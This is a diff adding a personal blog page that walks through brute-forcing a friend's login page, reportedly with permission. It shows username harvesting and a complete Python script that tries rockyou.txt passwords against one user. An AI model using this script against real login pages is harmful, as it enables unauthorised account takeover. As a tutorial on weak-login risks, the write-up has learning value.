@@ -1,0 +1,223 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<title>How I Bruteforced a Friend's Website.</title>
+	<meta charset="utf-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+	<link rel="stylesheet" href="assets/css/main.css" />
+	<link rel="apple-touch-icon" sizes="180x180" href="assets/icon/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="assets/icon/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="assets/icon/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="stylesheet"
+		href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+</head>
+
+<body class="is-preload">
+
+	<!-- Wrapper -->
+	<div id="wrapper">
+
+		<!-- Main -->
+		<div id="main">
+			<div class="inner">
+
+				<!-- Header -->
+				<header id="header">
+					<a href="index.html" class="logo"><strong>SAIRAZEX</strong> by Sairaj Mhatre</a>
+					<ul class="icons">
+						<li><a href="#" class="icon brands fa-linkedin"><span class="label">Linkedin</span></a></li>
+						<li><a href="#" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li>
+						<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
+
+					</ul>
+				</header>
+
+				<section>
+					<header class="main">
+						<h1>How I Bruteforced a Friend's Website. </h1>
+					</header>
+
+					<span class="image main"><img src="images/blg_1_1.png" alt="" /></span>
+					<p style="color: red;">*** Everything Was done after taking Prior Permission from the Owner/devloper
+						of the Website*** </p>
+
+					<p>So my friend had made a website which would serve various class notes related to subjects to the
+						users as a Mini project
+						so when he was showing me his website ,i saw the login page , i asked him whether he thinks its
+						Vulnerable or not , he said absolutly it is so out of curiosity i asked him if i can try to get
+						in without authentication , And he Agreed :) So i got to work .</p>
+
+
+
+
+					<p>While Looking through the website for finding anything that i can use to try to get in
+						i found that anyone can view the notes without ever logging In as well as see the user who
+						uploaded the respective file , It was not a Bug but a Feature of the Site , so without any much
+						effort i had usernames for existing user on the site .</p>
+
+					<span class="image fit"><img src="images/blg_1_2.png" alt="" /></span>
+					<p>Now that i had the usernames I could try to bruteforce the login page using them , so I created a
+						python script to do it for me.
+						This is How i did it .</p>
+
+
+					<p>First I opened My browser and navigated to the Login page and entered a random username and
+						password and pressed the Login Button
+						And.....got an Error : Invalid Credentials , as expected :D , then i viewed the Http-request
+						Body using the Network section of the browser and noted it .</p>
+					<span class="image fit"><img src="images/blg_1_3.png" alt="" /></span>
+
+
+					<h3>Alright This is the Script ..</h3>
+
+
+					<p>First i imported the Requests module , to use the http-requests functionality</p>
+
+
+					<pre><code class="language-py">import requests</code></pre>
+
+
+					<p>Then i wrote the `login` function and defined the request body as per I noted earlier
+					</p>
+
+
+					<pre><code class="language-py">url = "https://xxxxx.xxxxxxxxxxx.com/login.php"
+
+def login(username ,password):
+	r = requests.post(url,data = {
+		"username" :username,
+		"password" :password,
+		"submit":"Login",
+
+	})
+	return r</code></pre>
+
+
+
+					<p>Next I made a List containing the Most common passwords in the world using the <a
+							href="https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt">
+							rockyou.txt</a> file which is a wellknown wordlist</p>
+
+
+					<pre><code class="language-py">passwords = []
+with open("rockyou.txt", "r", encoding="latin-1") as h:
+	for line in h:
+		line = line.strip()
+		if line:
+			passwords.append(line)
+						</code></pre>
+
+					<p>Now using the Username which found earlier and the password list we use a For loop to login with
+						our given user name and every passowrd in the list. And at the same time checking the text in
+						the response which did not contain the text "Failed" , so that we could know if an login attempt
+						was successfull.
+					</p>
+
+					<!-- <hr class="major" /> -->
+
+					<pre><code class="language-py">user="Sallu007"
+i=1
+for password in passwords:
+	response = login(user,password).text
+
+
+	no = "Failed"
+	if no in response:
+		print(f"Trying ....count : {i}")
+	else:
+		print("Found!!!")
+		print(f"username {user} Password {password}: ")
+		break
+	i=i+1</code></pre>
+
+					<p>And now lets see how it worked ...</p>
+					<span class="image fit"><img src="images/blg_1_4.png" alt="" /></span>
+
+
+					<p>So that was it ...A Simple Login page Bruteforce with a comman password wordlist.</p>
+					<h4>If you liked the Read please check out my Other Blogs and Check out my Socials for more
+						Updates!!!</h4>
+
+
+
+			</div>
+		</div>
+
+		<!-- Sidebar -->
+		<div id="sidebar">
+			<div class="inner">
+
+
+
+				<!-- Menu -->
+				<nav id="menu">
+					<header class="major">
+						<h2>Menu</h2>
+					</header>
+					<ul>
+						<li><a href="index.html">Home</a></li>
+
+						<li>
+							<span class="opener">Blogs</span>
+							<ol>
+								<li><a style="color:#8d8d8d" href="Blog_1.html">How I Bruteforced a Friend's Website.</a></li>
+								<li><a style="color:#8d8d8d" href="#">aur ek blog</a></li>
+								<li><a style="color:#8d8d8d" href="#">ye last wala blog</a></li>
+
+							</ol>
+						</li>
+						<li><a href="#aboutme">About Me</a></li>
+
+
+
+					</ul>
+				</nav>
+
+
+
+				<!-- Section -->
+				<section>
+					<header class="major">
+						<h2>Get in touch</h2>
+					</header>
+					<p>Sed varius enim lorem ullamcorper dolore aliquam aenean ornare velit lacus, ac varius enim lorem
+						ullamcorper dolore. Proin sed aliquam facilisis ante interdum. Sed nulla amet lorem feugiat
+						tempus aliquam.</p>
+					<ul class="contact">
+						<li class="icon solid fa-envelope"><a href="#">sairajbmhatre@gmail.com</a></li>
+						<li class="icon solid fa-home"> Mumbai <br />
+							Maharastra , India</li>
+					</ul>
+
+					<ul class="icons">
+						<li><a href="#" class="icon brands fa-linkedin"><span class="label">Linkedin</span></a></li>
+						<li><a href="#" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li>
+						<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
+					</ul>
+				</section>
+
+				<!-- Footer -->
+				<footer id="footer">
+					<p class="copyright">&copy;SAIRAZEX. All rights reserved. Made With &#128151;</p>
+				</footer>
+
+			</div>
+		</div>
+
+	</div>
+
+	<!-- Scripts -->
+	<script src="assets/js/jquery.min.js"></script>
+	<script src="assets/js/browser.min.js"></script>
+	<script src="assets/js/breakpoints.min.js"></script>
+	<script src="assets/js/util.js"></script>
+	<script src="assets/js/main.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/languages/go.min.js"></script>
+	<script>hljs.highlightAll();</script>
+
+</body>
+
+</html>
